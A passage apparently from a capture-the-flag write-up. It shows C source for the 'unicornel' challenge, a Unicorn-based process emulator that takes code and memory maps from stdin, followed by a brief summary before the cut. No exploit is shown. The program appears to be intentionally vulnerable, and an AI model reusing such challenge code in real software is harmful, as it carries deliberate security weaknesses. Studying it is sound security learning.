</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">unicornelf</span> <span class="n">process_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//Signal to client that we&#39;re ready to receive process_data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;DATA_START</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="o">&amp;</span><span class="n">process_data</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">process_data</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">ret</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">process_data</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Unexpected read size</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span> <span class="o">||</span> <span class="o">!</span><span class="n">process_data</span><span class="p">.</span><span class="n">num_maps</span> <span class="o">||</span> <span class="n">process_data</span><span class="p">.</span><span class="n">num_maps</span> <span class="o">&gt;</span> <span class="mi">4</span> <span class="o">||</span> <span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span> <span class="o">&gt;</span> <span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">length</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Malformed process data</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//Only allow one process per architecture
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="n">process_data</span><span class="p">.</span><span class="n">arch</span> <span class="o">&gt;=</span> <span class="n">UC_ARCH_MAX</span> <span class="o">||</span> <span class="n">process_data</span><span class="p">.</span><span class="n">arch</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Invalid arch specified</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span><span class="o">*</span> <span class="n">code_recv</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//Signal to client that we&#39;re ready to receive process code
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;CODE_START</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">code_recv</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">uc_engine</span> <span class="o">*</span><span class="n">uc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">uc_err</span> <span class="n">err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_open</span><span class="p">(</span><span class="n">process_data</span><span class="p">.</span><span class="n">arch</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">mode</span><span class="p">,</span><span class="o">&amp;</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_open() %u %u with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">arch</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">mode</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">code_recv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">process_data</span><span class="p">.</span><span class="n">num_maps</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_mem_map</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">va</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">length</span><span class="p">,</span><span class="n">UC_PROT_ALL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Failed on uc_mem_map() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">code_recv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">uc_close</span><span class="p">(</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_mem_write</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">va</span><span class="p">,</span><span class="n">code_recv</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">free</span><span class="p">(</span><span class="n">code_recv</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;failed on uc_mem_write() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">uc_close</span><span class="p">(</span><span class="n">uc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">uc_hook</span> <span class="n">trace</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">pipefds</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pipe</span><span class="p">(</span><span class="n">pipefds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">pid</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="n">pipefds</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">pid</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">pid</span><span class="p">].</span><span class="n">revents</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">struct</span> <span class="n">process</span><span class="o">*</span> <span class="n">new_process</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">process</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">outfd</span> <span class="o">=</span> <span class="n">pipefds</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">uc</span> <span class="o">=</span> <span class="n">uc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">trusted_zone_hook</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">trustzone_mode</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">arch</span> <span class="o">=</span> <span class="n">process_data</span><span class="p">.</span><span class="n">arch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">entrypoint</span> <span class="o">=</span> <span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">va</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">code_length</span> <span class="o">=</span> <span class="n">process_data</span><span class="p">.</span><span class="n">code_length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">(</span><span class="n">new_process</span><span class="o">-&gt;</span><span class="n">maps</span><span class="p">,</span><span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">process_data</span><span class="p">.</span><span class="n">maps</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="n">new_process</span><span class="o">-&gt;</span><span class="n">num_maps</span> <span class="o">=</span> <span class="n">process_data</span><span class="p">.</span><span class="n">num_maps</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">processes</span><span class="p">[</span><span class="n">pid</span><span class="p">]</span> <span class="o">=</span> <span class="n">new_process</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">err</span> <span class="o">=</span> <span class="nf">uc_hook_add</span><span class="p">(</span><span class="n">uc</span><span class="p">,</span><span class="o">&amp;</span><span class="n">trace</span><span class="p">,</span><span class="n">UC_HOOK_INTR</span><span class="p">,</span><span class="n">hook_call</span><span class="p">,</span><span class="n">new_process</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">err</span> <span class="o">!=</span> <span class="n">UC_ERR_OK</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;failed on uc_hook_add() with error %u</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">err</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">destroy_process</span><span class="p">(</span><span class="n">new_process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="kt">pthread_attr_t</span> <span class="n">attr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_attr_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_attr_setdetachstate</span><span class="p">(</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="n">PTHREAD_CREATE_DETACHED</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">pthread_err</span> <span class="o">=</span> <span class="nf">pthread_create</span><span class="p">(</span><span class="o">&amp;</span><span class="n">new_process</span><span class="o">-&gt;</span><span class="kr">thread</span><span class="p">,</span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="n">process_thread</span><span class="p">,</span><span class="n">new_process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">pthread_err</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;failed to create pthread</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">destroy_process</span><span class="p">(</span><span class="n">new_process</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;new process created with pid %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">pid</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_mutex_unlock</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">pthread_err</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="mi">0</span> <span class="cm">/* stdin */</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">pfds</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">].</span><span class="n">revents</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_PROCESSES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">events</span> <span class="o">=</span> <span class="n">POLLIN</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Welcome to the unicornel!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">pthread_mutex_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">task_lock</span><span class="p">,</span><span class="nb">NULL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">poll</span><span class="p">(</span><span class="n">pfds</span><span class="p">,</span><span class="n">MAX_PROCESSES</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span><span class="p">(</span><span class="kt">unsigned</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_PROCESSES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//Data available from emulated process
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLIN</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="kt">int</span> <span class="n">nbytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="nf">ioctl</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">,</span><span class="n">FIONREAD</span><span class="p">,</span><span class="o">&amp;</span><span class="n">nbytes</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nf">splice</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span> <span class="cm">/* stdout */</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">nbytes</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//Process ended, and the write end of the pipe was closed in destroy_process. Finish cleanup
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLHUP</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="n">pfds</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">fd</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">pfds</span><span class="p">[</span><span class="n">MAX_PROCESSES</span><span class="p">].</span><span class="n">revents</span> <span class="o">&amp;</span> <span class="n">POLLIN</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//Received new process data
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nf">start_process</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="nf">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The code above is quite long with a lot of implementation details, but let me summarize what it does at a high level. Basically, this program implements a custom process emulation system using the Unicorn emulation engine. When we interact with the program, we can spawn new processes that will be emulated in their own threads. Each emulated process can perform syscalls through a custom syscall interface (defined in <code>syscalls.c</code>) to interact with the host system. The program handles I/O between the emulated processes and the host system.</p>
<p>Now, let&rsquo;s take a look at the <code>syscalls.c</code> file and analyze it:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
